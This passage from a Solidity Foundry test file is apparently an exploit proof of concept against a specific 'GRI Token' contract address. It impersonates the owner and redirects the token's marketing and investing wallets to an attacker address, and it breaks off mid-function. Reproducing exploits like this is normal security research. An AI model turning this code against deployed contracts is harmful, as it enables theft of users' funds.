contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x134C857757308AEeC4c20CA2A583F560a906ed28;
    address attacker = address(this);
    IGRI token;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IGRI(TARGET);
        owner = token.owner();
        vm.label(owner, "Owner");
        vm.label(address(token), "GRI Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial attacker BNB balance
        uint256 initialBalance = attacker.balance;

        // Create a helper address to transfer from
        address helper = address(0x1234567890123456789012345678901234567890);
        vm.label(helper, "Helper");

        // Impersonate owner to change wallet addresses
        vm.startPrank(owner);
        token.setMarketingWallet(attacker);
        token.setInvestingWallet(attacker);
        vm.stopPrank();

